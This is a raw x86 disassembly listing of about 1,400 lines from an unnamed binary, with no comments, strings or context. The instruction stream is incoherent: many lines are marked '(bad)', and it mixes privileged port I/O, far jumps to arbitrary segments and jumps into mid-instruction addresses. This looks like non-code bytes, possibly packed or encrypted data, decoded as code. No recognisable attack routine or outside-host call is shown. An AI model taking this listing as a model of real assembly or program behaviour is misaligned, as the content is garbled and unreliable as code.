  404f9a:	mov    WORD PTR [eax-0x172112b9],?
  404fa0:	sbb    eax,0x98b43e49
  404fa5:	sbb    ah,dh
  404fa7:	mov    ds:0xeeef2302,eax
  404fac:	add    ch,BYTE PTR [esi]
  404fae:	iret   
  404faf:	push   esi
  404fb0:	xor    ebx,DWORD PTR [ebx]
  404fb2:	mov    cl,0x83
  404fb4:	pop    es
  404fb5:	ins    DWORD PTR es:[edi],dx
  404fb6:	push   esp
  404fb7:	cld    
  404fb8:	std    
  404fb9:	or     DWORD PTR [esi],ebx
  404fbb:	jmp    0xb795:0xa8b4262e
  404fc2:	clc    
  404fc3:	xlat   BYTE PTR ds:[ebx]
  404fc4:	jnp    0x404fca
  404fc6:	pop    esi
  404fc7:	push   0x22
  404fc9:	pop    edx
  404fca:	push   cs
  404fcb:	inc    edi
  404fcc:	lea    eax,[ecx]
  404fce:	out    0x47,eax
  404fd0:	jge    0x405050
  404fd2:	push   ebp
  404fd3:	ds jno 0x404fc8
  404fd6:	xor    ebx,DWORD PTR [edi+ebp*2+0x6c]
  404fda:	xor    cl,BYTE PTR [edx+edx*1+0x3eea2c6f]
  404fe1:	dec    eax
  404fe2:	xchg   esi,eax
  404fe3:	or     BYTE PTR [esi],ah
  404fe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fe6:	ins    DWORD PTR es:[edi],dx
  404fe7:	sbb    DWORD PTR [ecx],eax
  404fe9:	int    0xd3
  404feb:	in     eax,dx
  404fec:	jmp    0x1958b0a3
  404ff1:	icebp  
  404ff2:	pop    eax
  404ff3:	sbb    al,0x91
  404ff5:	fld    TBYTE PTR [ebp-0x78]
  404ff8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ff9:	adc    BYTE PTR es:[edi-0x6d],al
  404ffd:	dec    edi
  404ffe:	out    dx,al
  404fff:	jg     0x404ff6
  405001:	push   ebp
  405002:	(bad)
  405007:	ret    
  405008:	xor    al,0xf6
  40500a:	xor    al,0x41
  40500c:	lock pop ds
  40500e:	dec    esp
  40500f:	adc    ah,dh
  405011:	(bad)  
  405012:	retf   
  405013:	in     eax,dx
  405014:	out    0x1a,al
  405016:	(bad)  [edi]
  405018:	shr    edi,0x40
  40501b:	push   ds
  40501c:	jmp    0xa235:0x745373b8
  405023:	sti    
  405024:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  405026:	mov    ebp,0x8b7044a4
  40502b:	cwde   
  40502c:	js     0x404fe3
  40502e:	cmp    eax,0xbc03547b
  405033:	or     ch,BYTE PTR [eax]
  405035:	dec    esi
  405036:	iret   
  405037:	fadd   QWORD PTR [ebx-0x53]
  40503a:	in     al,0x96
  40503c:	add    eax,0x9057cf26
  405041:	fstp   QWORD PTR [ebx-0x6]
  405044:	or     bl,ah
  405046:	sti    
  405047:	or     eax,0x616ce5c5
  40504c:	int3   
  40504d:	mov    al,bl
  40504f:	add    eax,0xea25628
  405054:	add    DWORD PTR [ecx+0x26],esp
  405057:	adc    BYTE PTR [ebx+0x6d],0xdd
  40505b:	xor    DWORD PTR [esi+0x16e29dd4],ebp
  405061:	inc    ebx
  405062:	jno    0x405066
  405064:	push   esp
  405065:	shl    ebx,0x97
  405068:	xor    DWORD PTR [ecx-0x4d8c51cf],0x6d9327a8
  405072:	idiv   edx
  405074:	cmp    al,BYTE PTR [ebp-0x31]
  405077:	(bad)  
  405078:	cwde   
  405079:	jno    0x405077
  40507b:	fisub  DWORD PTR [ecx+0x3fe79b1f]
  405081:	push   DWORD PTR [ebx+0x7]
  405084:	adc    cl,BYTE PTR [esi-0x2a]
  405087:	dec    ebx
  405088:	test   ebx,edi
  40508a:	pop    edx
  40508b:	(bad)  
  40508c:	fiadd  DWORD PTR [edx+0xd]
  40508f:	(bad)  
  405090:	out    dx,eax
  405091:	lea    eax,[edx]
  405093:	or     al,0xe5
  405095:	mov    al,ds:0xcfe86703
  40509a:	adc    esi,DWORD PTR [edx]
  40509c:	ffree  st(4)
  40509e:	loopne 0x405084
  4050a0:	push   ss
  4050a1:	pop    esp
  4050a2:	jl     0x405116
  4050a4:	xchg   edx,eax
  4050a5:	int3   
  4050a6:	xor    DWORD PTR [ebp+0x70aa4b9b],0xffffffa7
  4050ad:	jl     0x40508a
  4050af:	sbb    ebp,ebp
  4050b1:	cli    
  4050b2:	inc    esi
  4050b3:	or     edi,ecx
  4050b5:	test   eax,0x1edf988e
  4050ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050bb:	mov    ebp,0xf61651dc
  4050c0:	retf   
  4050c1:	sub    DWORD PTR [ebp+0x50],0x45
  4050c5:	mov    esp,0x9780c888
  4050ca:	out    dx,al
  4050cb:	retf   0x6fc3
  4050ce:	dec    esp
  4050cf:	scas   eax,DWORD PTR es:[edi]
  4050d0:	inc    edx
  4050d2:	hlt    
  4050d3:	icebp  
  4050d4:	dec    ebp
  4050d5:	sbb    dl,BYTE PTR [ebx-0x2e07af46]
  4050db:	sbb    DWORD PTR [esi+0x3a],edi
  4050de:	mov    dl,0x37
  4050e0:	shl    BYTE PTR [ecx+0x5ffcfc1],1
  4050e6:	dec    esi
  4050e7:	nop
  4050e8:	jecxz  0x405122
  4050ea:	dec    esi
  4050eb:	jo     0x40513b
  4050ed:	out    dx,al
  4050ee:	push   edx
  4050ef:	sahf   
  4050f0:	xchg   edx,eax
  4050f1:	addr16 fwait
  4050f3:	or     eax,0x4f7c4c5d
  4050f8:	mov    ebp,0xfc9bd0ce
  4050fd:	push   cs
  4050fe:	dec    esi
  4050ff:	fcomp  DWORD PTR [ebx+0x45aa824f]
  405105:	outs   dx,DWORD PTR ds:[esi]
  405106:	leave  
  405107:	div    DWORD PTR [esi-0x54]
  40510a:	ds mov bl,0xeb
  40510d:	iret   
  40510e:	int3   
  40510f:	sahf   
  405110:	fbld   TBYTE PTR [ebp-0x28e9c371]
  405116:	pop    ss
  405117:	call   0xd5ea3e93
  40511c:	call   FWORD PTR [esi+0x33]
  40511f:	jmp    0x970f57bd
  405124:	xchg   esp,eax
  405125:	hlt    
  405126:	push   edi
  405127:	jmp    0x3c38:0xd1de4e2d
  40512e:	pusha  
  40512f:	std    
  405130:	retf   
  405131:	mov    dh,0xee
  405133:	inc    ecx
  405134:	repnz frstor [edx]
  405137:	out    0xa9,al
  405139:	xor    eax,DWORD PTR [ebx+0x2471e7c4]
  40513f:	and    eax,0xe4e95d12
  405144:	cli    
  405145:	daa    
  405146:	ret    0xfdc0
  405149:	(bad)  
  40514a:	stos   DWORD PTR es:[edi],eax
  40514b:	out    dx,al
  40514c:	push   ebx
  40514d:	mov    ebp,esp
  40514f:	xor    al,0x26
  405151:	or     al,0xc1
  405153:	pop    esp
  405154:	mov    ebx,0xa5a75e2d
  405159:	ficomp WORD PTR [eax+0x8]
  40515c:	pusha  
  40515d:	gs mov dh,0xed
  405160:	push   edx
  405161:	addr16 or eax,0xf902eb4c
  405167:	and    edi,edi
  405169:	(bad)  
  40516a:	mov    ?,WORD PTR [edi+0x14]
  40516d:	mov    ebp,0x219e21fc
  405172:	pop    ebx
  405173:	not    DWORD PTR [ebx+0x4b]
  405176:	fist   WORD PTR [esi]
  405178:	test   BYTE PTR [edx+esi*8-0x4d],ch
  40517c:	pop    ecx
  40517d:	(bad)  
  40517e:	jae    0x4051d4
  405180:	add    eax,0xf8015f45
  405185:	push   0xffffff99
  405187:	push   0x37
  405189:	scas   al,BYTE PTR es:[edi]
  40518a:	lds    esp,FWORD PTR [esi-0x19d48bfb]
  405190:	scas   eax,DWORD PTR es:[edi]
  405191:	jmp    0xd70f16f7
  405196:	push   ecx
  405197:	and    ebx,esp
  405199:	and    WORD PTR [ebp+0x61b32510],dx
  4051a0:	sub    al,0x5d
  4051a2:	not    DWORD PTR [ecx+0x7fc78a4f]
  4051a8:	dec    esp
  4051a9:	call   0xbac9:0x92ee1c9b
  4051b0:	jmp    0x6686dacd
  4051b5:	mov    edi,0xd556a750
  4051ba:	or     cl,BYTE PTR [ecx+0x5259debe]
  4051c0:	cli    
  4051c1:	push   ds
  4051c2:	cwde   
  4051c3:	and    DWORD PTR [edx+0x100263f7],esi
  4051c9:	mov    al,ds:0x15c26ee
  4051ce:	mov    edx,DWORD PTR [ebx-0x23]
  4051d1:	std    
  4051d2:	add    BYTE PTR [ebx+0x1ea18eba],dl
  4051d8:	fisttp QWORD PTR [edx-0xe]
  4051db:	mov    ch,0xe1
  4051dd:	cli    
  4051de:	mov    cl,0xd6
  4051e0:	sbb    eax,0xa888ff09
  4051e5:	mov    edx,0xfe87fd0b
  4051ea:	dec    ebx
  4051eb:	fwait
  4051ec:	js     0x405174
  4051ee:	inc    edi
  4051ef:	jns    0x405173
  4051f1:	inc    edi
  4051f2:	or     al,0x49
  4051f4:	sub    al,BYTE PTR [ecx]
  4051f6:	push   ebx
  4051f7:	(bad)  
  4051f8:	mov    edx,DWORD PTR [edx-0x7f]
  4051fb:	test   BYTE PTR [esi],0xc0
  4051fe:	xor    al,0x87
  405200:	add    BYTE PTR [eax],ch
  405202:	loop   0x40527f
  405204:	cmp    eax,0x7e
  405207:	push   ebp
  405208:	jmp    0x6459:0x7324faa6
  40520f:	pop    esi
  405210:	mov    bl,0x55
  405212:	or     cl,bh
  405214:	aad    0xc1
  405216:	inc    ebx
  405217:	push   esp
  405218:	push   0xfffffffb
  40521a:	pop    ebx
  40521b:	mov    ecx,0x9169da3c
  405220:	aad    0xbd
  405222:	loopne 0x405270
  405224:	cld    
  405225:	xor    esi,DWORD PTR [ebx]
  405227:	mov    bl,BYTE PTR [edx+0x58]
  40522a:	out    0x48,eax
  40522c:	iret   
  40522d:	mov    BYTE PTR [ebp+0x6d],al
  405230:	aam    0xf9
  405232:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405234:	gs pusha 
  405236:	cmp    eax,0xb30639bd
  40523b:	fld    TBYTE PTR [esp+ecx*2-0x339a8c09]
  405242:	out    0xf7,eax
  405244:	jae    0x40529a
  405246:	aaa    
  405247:	and    ch,ch
  405249:	add    ebx,edi
  40524b:	push   eax
  40524c:	pushf  
  40524d:	dec    edi
  40524e:	shl    DWORD PTR [edx+ebx*4+0x76],cl
  405252:	adc    ch,bh
  405254:	sbb    BYTE PTR [eax],bl
  405256:	fs cmp eax,0x1df21955
  40525c:	jl     0x405224
  40525e:	inc    edi
  40525f:	fcmovnbe st,st(6)
  405261:	cmc    
  405262:	sbb    eax,0xf53424f
  405267:	jecxz  0x4052af
  405269:	fnstsw WORD PTR [edi+0x62]
  40526c:	in     al,0x72
  40526e:	mov    edi,0xf503afb1
  405273:	cmp    edx,DWORD PTR ds:0xf74f5333
  405279:	fdiv   DWORD PTR [eax+0x35]
  40527c:	cmp    edx,DWORD PTR [ecx-0x78]
  40527f:	xchg   ecx,eax
  405280:	add    ecx,DWORD PTR [edi+0x68]
  405283:	out    dx,eax
  405284:	arpl   WORD PTR [eax+0x6d],sp
  405287:	jnp    0x405219
  405289:	dec    ebp
  40528a:	shl    BYTE PTR [ebx-0x6e2f2287],cl
  405290:	mov    ch,0x74
  405292:	dec    edx
  405293:	add    ebp,0x8338a86e
  405299:	cmp    eax,0x5aa825b8
  40529e:	inc    esp
  40529f:	pop    edx
  4052a0:	xchg   edi,eax
  4052a1:	pop    ebp
  4052a2:	inc    edi
  4052a3:	mov    ds,WORD PTR [ebx]
  4052a5:	jl     0x405270
  4052a7:	mov    ebp,0xd1fec357
  4052ac:	ins    BYTE PTR es:[edi],dx
  4052ad:	inc    ebx
  4052ae:	fnstcw WORD PTR [eax+ebx*8+0xb]
  4052b2:	mov    bh,0x3f
  4052b4:	(bad)  
  4052b5:	js     0x40531a
  4052b7:	jae    0x40523a
  4052b9:	adc    dl,dl
  4052bb:	add    eax,0xe702298f
  4052c0:	icebp  
  4052c1:	sub    BYTE PTR [ecx],0x79
  4052c4:	dec    ebx
  4052c5:	jg     0x4052ea
  4052c7:	push   ss
  4052c8:	jbe    0x405320
  4052ca:	mov    DWORD PTR [ebp-0x1e],ebp
  4052cd:	mov    ch,0x5d
  4052cf:	mul    BYTE PTR [edx]
  4052d1:	(bad)  
  4052d2:	fstp   QWORD PTR [edi-0x1e]
  4052d5:	mov    cl,0x70
  4052d7:	stos   DWORD PTR es:[edi],eax
  4052d8:	mov    ah,0xf2
  4052da:	in     eax,dx
  4052db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052dc:	test   edx,0x5ce4029b
  4052e2:	aad    0xef
  4052e4:	sar    DWORD PTR [esi+0x67],0xa5
  4052e8:	out    dx,al
  4052e9:	scas   al,BYTE PTR es:[edi]
  4052ea:	jecxz  0x405304
  4052ec:	test   dh,al
  4052ee:	int    0xd2
  4052f0:	jp     0x4052b2
  4052f2:	gs dec esp
  4052f4:	mov    WORD PTR [edx+ecx*2],cs
  4052f7:	dec    esi
  4052f8:	stos   BYTE PTR es:[edi],al
  4052f9:	sub    dl,bl
  4052fb:	(bad)  
  4052fd:	jle    0x405302
  4052ff:	in     al,dx
  405300:	pop    ecx
  405301:	mov    edi,0xa5c3261a
  405306:	daa    
  405307:	mov    esi,0x892d5eb1
  40530c:	scas   eax,DWORD PTR es:[edi]
  40530d:	lea    edi,[ebp+0xa91f793]
  405313:	dec    esi
  405314:	mov    DWORD PTR ds:0xd988ffc4,eax
  40531a:	xchg   sp,ax
  40531c:	leave  
  40531d:	imul   ebx,DWORD PTR [eax+0x54],0xffffff84
  405321:	fcmovu st,st(2)
  405323:	xor    al,0xd1
  405325:	xchg   esp,eax
  405326:	and    DWORD PTR [edx-0x2bb366a3],edi
  40532c:	(bad)  
  40532d:	repz in eax,dx
  40532f:	add    al,BYTE PTR [eax+eiz*8-0x75b56943]
  405336:	test   DWORD PTR [ebx-0x66],edx
  405339:	adc    esp,DWORD PTR [ecx-0x1e]
  40533c:	pop    ebx
  40533d:	cwde   
  40533e:	jl     0x4053aa
  405340:	adc    eax,0x157fe7c
  405345:	ja     0x4052de
  405347:	sar    edi,0x59
  40534a:	call   FWORD PTR [edx-0x375d7a5e]
  405350:	jmp    0x2b6b:0x726a4f1
  405357:	jp     0x4053c4
  405359:	cli    
  40535a:	mov    bl,0x48
  40535c:	out    0xc8,eax
  40535e:	call   0x1c2a:0x2010af61
  405365:	xchg   dh,cl
  405367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405368:	repz mov eax,0xfd9bcf2f
  40536e:	sbb    al,0x4
  405370:	pusha  
  405371:	push   ebx
  405372:	sbb    WORD PTR [esi+eax*8+0x51],bx
  405377:	cmp    BYTE PTR [eax+eax*2+0x7254414],ah
  40537e:	inc    esp
  40537f:	mov    cl,0xe2
  405381:	cwde   
  405382:	xor    BYTE PTR [edx-0x6cf1f7f2],ah
  405388:	lods   al,BYTE PTR ds:[esi]
  405389:	add    al,0x86
  40538b:	mov    ah,0x35
  40538d:	xor    dl,cl
  40538f:	cmp    edi,DWORD PTR [edx+0x4de441b5]
  405395:	mov    eax,ds:0xccb5253c
  40539a:	xor    esp,DWORD PTR [eax]
  40539c:	or     DWORD PTR [ecx],ebp
  40539e:	push   ebp
  40539f:	lea    edi,[esi*4-0x1bb2b650]
  4053a6:	push   eax
  4053a7:	sub    al,0xed
  4053a9:	stc    
  4053aa:	jne    0x405385
  4053ac:	mov    ebp,esi
  4053ae:	cdq    
  4053af:	pop    ds
  4053b0:	je     0x405423
  4053b2:	jmp    0x1ede:0x86c0f08f
  4053b9:	js     0x40535e
  4053bb:	xchg   edx,eax
  4053bc:	inc    edi
  4053bd:	sbb    BYTE PTR [edx+0x149b089e],dh
  4053c3:	dec    ebx
  4053c4:	adc    eax,0x1973de81
  4053c9:	std    
  4053ca:	scas   eax,DWORD PTR es:[edi]
  4053cb:	cld    
  4053cc:	and    DWORD PTR [edx-0x5],ebx
  4053cf:	mov    ds:0x19087baa,al
  4053d4:	pop    esp
  4053d5:	push   edx
  4053d6:	ror    bl,0xc7
  4053d9:	dec    esp
  4053da:	and    eax,0x85fb46a8
  4053df:	mov    al,0xec
  4053e1:	(bad)  
  4053e3:	jb     0x40545b
  4053e5:	retf   
  4053e6:	mov    edi,0x67df8a47
  4053eb:	cmp    DWORD PTR [edi+esi*1+0x28779e76],esi
  4053f2:	adc    eax,0x2d15a155
  4053f7:	enter  0xfef,0x20
  4053fb:	mov    esp,DWORD PTR [eax-0xbdd3e19]
  405401:	jmp    0xdd02adb2
  405406:	mov    eax,fs:0x83fb91bb
  40540c:	ret    
  40540d:	int    0x4
  40540f:	js     0x40540a
  405411:	les    ebp,FWORD PTR [eax-0x32]
  405414:	out    dx,al
  405415:	aam    0x26
  405417:	pop    ecx
  405418:	ds dec edi
  40541a:	lods   eax,DWORD PTR ds:[esi]
  40541b:	adc    DWORD PTR [edx-0x1c049594],ebx
  405421:	mov    edi,0x585a78e6
  405426:	sbb    al,0xd8
  405428:	in     al,dx
  405429:	mov    esp,0x862e3109
  40542e:	fs dec esp
  405430:	mov    ebp,0xb62b0152
  405435:	push   0x2e
  405437:	dec    ebx
  405438:	xor    al,0x98
  40543a:	lods   al,BYTE PTR ds:[esi]
  40543b:	xchg   edx,eax
  40543c:	sbb    ecx,eax
  40543e:	cmp    dl,BYTE PTR [ebx-0x7eedf6e6]
  405444:	and    BYTE PTR [edx-0x76],dh
  405447:	imul   ecx,edx,0x56
  40544a:	push   esp
  40544b:	xor    ecx,DWORD PTR [eax+0x34]
  40544e:	aaa    
  40544f:	and    BYTE PTR [ebx-0x2f43d82d],cl
  405455:	std    
  405456:	mov    ebx,0x7def9459
  40545b:	leave  
  40545c:	push   edx
  40545d:	dec    ebp
  40545e:	in     al,0x47
  405460:	mov    ch,0x3
  405462:	call   0x6222bba3
  405467:	xchg   BYTE PTR [esi],ah
  405469:	xor    eax,0xb6088847
  40546e:	out    0xd8,al
  405470:	jmp    0x53b0f517
  405475:	xor    DWORD PTR [ebx+esi*1],esp
  405478:	in     al,dx
  405479:	adc    eax,0xf7038015
  40547e:	push   cs
  40547f:	outs   dx,DWORD PTR ds:[esi]
  405480:	out    dx,eax
  405481:	dec    ecx
  405482:	inc    eax
  405483:	inc    cx
  405485:	pop    eax
  405486:	sahf   
  405487:	std    
  405488:	xchg   esi,eax
  405489:	iret   
  40548a:	add    esi,DWORD PTR [ecx]
  40548c:	shl    DWORD PTR ds:0x8ba553bb,0x81
  405493:	adc    ebx,DWORD PTR [edi]
  405495:	jle    0x4054c6
  405497:	cld    
  405498:	retf   0xef98
  40549b:	push   eax
  40549c:	fiadd  WORD PTR [ebx]
  40549e:	jmp    0xdba8:0x3c0e8d88
  4054a5:	nop
  4054a6:	cmp    eax,0x75c3326f
  4054ab:	fchs   
  4054ad:	adc    eax,0x79ce46f5
  4054b2:	add    BYTE PTR [edx],0x49
  4054b5:	stos   BYTE PTR es:[edi],al
  4054b6:	sbb    ch,cl
  4054b8:	outs   dx,BYTE PTR ds:[esi]
  4054b9:	jne    0x4054f2
  4054bb:	cs push edi
  4054bd:	mov    ebx,0xbcee74fb
  4054c2:	xor    ecx,edi
  4054c4:	add    al,0x6e
  4054c6:	xchg   ebx,eax
  4054c7:	dec    edx
  4054c8:	sbb    DWORD PTR ds:0x415edd2a,0x70
  4054cf:	or     ebp,DWORD PTR [ebx]
  4054d1:	rcl    BYTE PTR [ebx+0x6e33faae],0xdc
  4054d8:	repz jge 0x405474
  4054db:	pop    esp
  4054dc:	adc    bh,BYTE PTR [eax+0x3471146]
  4054e2:	xchg   esi,eax
  4054e3:	dec    edi
  4054e4:	inc    ecx
  4054e5:	std    
  4054e6:	xor    ch,cl
  4054e8:	pop    esi
  4054e9:	jle    0x40553b
  4054eb:	mov    esi,0xca2f3197
  4054f0:	es mov dl,0x63
  4054f3:	ins    BYTE PTR es:[edi],dx
  4054f4:	mov    esi,ss
  4054f6:	sar    BYTE PTR [ecx+0x36796ba9],0x25
  4054fd:	out    0xa,eax
  4054ff:	data16 daa 
  405501:	test   al,0xa8
  405503:	fbld   TBYTE PTR [ecx+0xef7e6db]
  405509:	int    0xb2
  40550b:	cdq    
  40550c:	out    0x7b,al
  40550e:	adc    eax,0x3de444c3
  405513:	retf   0x2d2d
  405516:	inc    esi
  405517:	jne    0x40551e
  405519:	fsub   QWORD PTR [esi+0xb]
  40551c:	xchg   esp,eax
  40551d:	iret   
  40551e:	and    bl,dh
  405520:	push   0x6a572997
  405525:	sbb    BYTE PTR [ebx-0x7],bl
  405528:	out    0xf9,al
  40552a:	pop    edi
  40552b:	in     al,dx
  40552c:	mov    ecx,0x72d88720
  405531:	cmp    eax,0x1ad0c1b2
  405536:	adc    bl,bh
  405538:	push   esp
  405539:	sub    eax,0x6ac6b4e8
  40553e:	loopne 0x4054d5
  405540:	xor    ch,BYTE PTR [eax+0x18]
  405543:	jo     0x405574
  405545:	nop
  405546:	push   ecx
  405547:	mov    ch,0xf5
  405549:	and    cl,dl
  40554b:	outs   dx,DWORD PTR ds:[esi]
  40554c:	inc    esi
  40554d:	mov    ds:0xd3684108,al
  405552:	dec    edi
  405553:	std    
  405554:	faddp  st(2),st
  405556:	sub    eax,0xacd602ae
  40555b:	add    ah,BYTE PTR [edi+0x65466505]
  405561:	out    dx,eax
  405562:	inc    BYTE PTR [edi]
  405564:	pop    eax
  405565:	lahf   
  405566:	stos   BYTE PTR es:[edi],al
  405567:	das    
  405568:	scas   al,BYTE PTR es:[edi]
  405569:	popa   
  40556a:	retf   0xb6b9
  40556d:	jle    0x405596
  40556f:	push   ds
  405570:	jg     0x40554d
  405572:	jb     0x405594
  405574:	dec    esi
  405575:	and    eax,0x2f5a3f42
  40557a:	jbe    0x40552d
  40557c:	addr16 pop ebp
  40557e:	test   al,0xa1
  405580:	retf   
  405581:	stos   DWORD PTR es:[edi],eax
  405582:	dec    edx
  405583:	retf   0x7117
  405586:	xor    dh,ch
  405588:	or     eax,0x50f0dd56
  40558d:	pop    ebx
  40558e:	dec    ecx
  40558f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405590:	dec    eax
  405591:	pop    eax
  405592:	arpl   WORD PTR [ecx-0x57],di
  405595:	mov    esp,DWORD PTR [edi-0x65]
  405598:	(bad)  
  40559a:	fdivr  DWORD PTR [edx+0x34]
  40559d:	mov    ebp,0x897f6dae
  4055a2:	pop    edi
  4055a3:	sbb    eax,0x6acef66d
  4055a8:	pusha  
  4055a9:	cmp    al,0x2b
  4055ab:	push   esp
  4055ac:	push   edi
  4055ad:	adc    esi,DWORD PTR [esi-0x41337a]
  4055b3:	ret    
  4055b4:	cli    
  4055b5:	mov    ah,BYTE PTR [eax-0xc]
  4055b8:	inc    esi
  4055b9:	or     esp,edi
  4055bb:	aad    0xfb
  4055bd:	mov    esp,0xc0978cb7
  4055c2:	popf   
  4055c3:	or     ecx,eax
  4055c5:	out    0x5d,eax
  4055c7:	stc    
  4055c8:	aam    0x9a
  4055ca:	and    DWORD PTR [eax+0x23c7dc5f],esi
  4055d0:	out    dx,eax
  4055d1:	retf   
  4055d2:	sbb    al,0x6c
  4055d4:	out    dx,eax
  4055d5:	(bad)  
  4055d6:	enter  0xc13f,0x64
  4055da:	je     0x40560b
  4055dc:	sub    BYTE PTR [ebx+0x29912424],ah
  4055e2:	imul   edx,esi,0x14
  4055e5:	xchg   ebp,eax
  4055e6:	inc    ebx
  4055e7:	imul   ax,di,0xd834
  4055ec:	sti    
  4055ed:	xlat   BYTE PTR ds:[ebx]
  4055ee:	and    DWORD PTR [ecx+eax*2+0x69ce5c3e],esp
  4055f5:	mov    bh,0x69
  4055f7:	shl    al,0xa9
  4055fa:	adc    al,0xd1
  4055fc:	or     eax,0xe1d70b04
  405601:	out    dx,eax
  405602:	(bad)  
  405603:	sbb    BYTE PTR [ecx-0x67],bl
  405606:	(bad)  
  405607:	cs pop ebp
  405609:	fidiv  DWORD PTR [eax-0x77]
  40560c:	in     al,dx
  40560d:	shl    BYTE PTR [edi+0x535da26b],cl
  405613:	cmc    
  405614:	aaa    
  405615:	xor    al,0x8c
  405617:	dec    esi
  405618:	stos   DWORD PTR es:[edi],eax
  405619:	fdiv   DWORD PTR [edi+0x8]
  40561c:	xor    ebx,esp
  40561e:	sbb    esi,DWORD PTR cs:[ebx]
  405621:	cmp    bl,cl
  405623:	jb     0x4055c0
  405625:	adc    edx,esp
  405627:	adc    eax,0x3b0fe53b
  40562c:	mov    eax,ds:0xed6a03fe
  405631:	lds    ecx,FWORD PTR [edx-0x62]
  405634:	push   ebp
  405635:	inc    edx
  405636:	mov    BYTE PTR [eax+0x11d320af],bh
  40563c:	je     0x405662
  40563e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40563f:	(bad)  
  405640:	call   0xaa15:0x2502852c
  405647:	fisttp WORD PTR [esi]
  405649:	(bad)  
  40564a:	int3   
  40564b:	pusha  
  40564c:	and    eax,0x2d082d14
  405651:	data16 js 0x40560a
  405654:	(bad)  
  405655:	or     BYTE PTR [eax-0x6516f98],dl
  40565b:	out    0xdb,eax
  40565d:	sbb    al,0xef
  40565f:	pop    es
  405660:	push   DWORD PTR [esi-0x2c92790a]
  405666:	daa    
  405667:	ja     0x4055fe
  405669:	ins    DWORD PTR es:[edi],dx
  40566a:	ins    DWORD PTR es:[edi],dx
  40566b:	xchg   BYTE PTR [eax],bl
  40566d:	ins    BYTE PTR es:[edi],dx
  40566e:	pop    ebx
  40566f:	sbb    DWORD PTR [edi+ecx*8+0x10a8e7b9],esp
  405676:	adc    DWORD PTR [ebx+0x27c1f025],ebx
  40567c:	inc    edx
  40567d:	outs   dx,DWORD PTR ds:[esi]
  40567e:	push   ebx
  40567f:	push   esp
  405680:	mov    gs,ebx
  405682:	retf   0xb3e0
  405685:	fwait
  405686:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405687:	les    ebx,FWORD PTR [ecx+0x2a539e6e]
  40568d:	lahf   
  40568e:	std    
  40568f:	shr    BYTE PTR [ecx-0x13de1bce],0xdc
  405696:	or     cl,BYTE PTR [edx-0x44701cd5]
  40569c:	adc    al,0x97
  40569e:	jbe    0x4056db
  4056a0:	jns    0x4056af
  4056a2:	div    DWORD PTR [ebx+ebx*4+0x1f]
  4056a6:	and    dh,BYTE PTR [ecx+ecx*4-0x2083f18f]
  4056ad:	xor    BYTE PTR [edx-0x1e5f92a],al
  4056b3:	shl    BYTE PTR [ecx+ecx*4],0x52
  4056b7:	mov    al,0xf8
  4056b9:	mov    ch,al
  4056bb:	inc    esp
  4056bc:	mov    esi,0x625a8eef
  4056c1:	push   ds
  4056c2:	inc    ecx
  4056c3:	sub    eax,0xa69c2859
  4056c8:	mov    eax,0x6af86620
  4056cd:	pop    esi
  4056ce:	and    bl,0xe
  4056d1:	mov    ebx,0xa5447bc
  4056d6:	mov    esp,0xbcaf667a
  4056db:	jae    0x4056c6
  4056dd:	test   WORD PTR [edx+0x371c497f],ax
  4056e4:	or     ah,BYTE PTR [ebx-0x50fbc5a5]
  4056ea:	dec    esp
  4056eb:	into   
  4056ec:	cmc    
  4056ed:	repz xchg ebp,eax
  4056ef:	xchg   esp,eax
  4056f0:	cdq    
  4056f1:	sbb    ecx,eax
  4056f3:	mov    cl,0x85
  4056f5:	mov    al,ds:0x119d47db
  4056fa:	push   ss
  4056fb:	jp     0x4056b1
  4056fd:	pop    edx
  4056fe:	sbb    BYTE PTR [edi+0x1b48ee12],al
  405704:	leave  
  405705:	inc    edx
  405706:	iret   
  405707:	xchg   esi,eax
  405708:	cdq    
  405709:	je     0x4056a5
  40570b:	or     eax,0x56e9f458
  405710:	ds cmc 
  405712:	push   ebp
  405713:	xor    edx,DWORD PTR [edx+0x1a]
  405716:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405717:	dec    bp
  405719:	dec    DWORD PTR [ebx]
  40571b:	into   
  40571c:	add    dl,BYTE PTR [ecx]
  40571e:	and    ch,BYTE PTR [ebx-0xd]
  405721:	mov    ebp,0x3ab9f82a
  405726:	inc    ecx
  405727:	xchg   DWORD PTR [edi],ebp
  405729:	shr    DWORD PTR [eax],0x50
  40572c:	mov    eax,0xcf1964ad
  405731:	outs   dx,BYTE PTR ds:[esi]
  405732:	dec    eax
  405733:	adc    edi,eax
  405735:	inc    edx
  405736:	mov    eax,ds:0x76cc80b0
  40573b:	mov    eax,ds:0x83e4e9f8
  405740:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405741:	test   al,0x66
  405743:	pop    eax
  405744:	xchg   ecx,eax
  405745:	mov    edx,0x87de67c
  40574a:	test   BYTE PTR [esi-0x7065a9e2],ah
  405750:	ror    eax,0x84
  405753:	ja     0x296989b0
  405759:	fist   WORD PTR [eax]
  40575b:	not    BYTE PTR [ebp+0x5c]
  40575e:	js     0x405780
  405760:	jne    0x405729
  405762:	xor    al,0x61
  405764:	pop    esp
  405765:	sbb    BYTE PTR [esi],bh
  405767:	inc    edx
  405768:	ja     0x405776
  40576a:	mov    esi,0xd6688e2a
  40576f:	aaa    
  405770:	push   0x438eb81a
  405775:	mov    al,0xf3
  405777:	add    al,0x7b
  405779:	mov    eax,ds:0x79e42a36
  40577e:	mov    ch,0x83
  405780:	mov    al,ds:0x9a0f11bb
  405785:	mov    ch,0x1b
  405787:	rcr    DWORD PTR [edi+0xa6988e9],cl
  40578d:	mov    esp,DWORD PTR [edi+0x25]
  405790:	aam    0x9b
  405792:	call   0x8c89:0xc3c37947
  405799:	cbw    
  40579b:	push   cs
  40579c:	jmp    0xe242:0x3b59a8b1
  4057a3:	push   ebp
  4057a4:	ins    DWORD PTR es:[edi],dx
  4057a5:	jmp    0xf8524fd8
  4057aa:	jmp    0x6d347d33
  4057af:	lods   al,BYTE PTR ds:[esi]
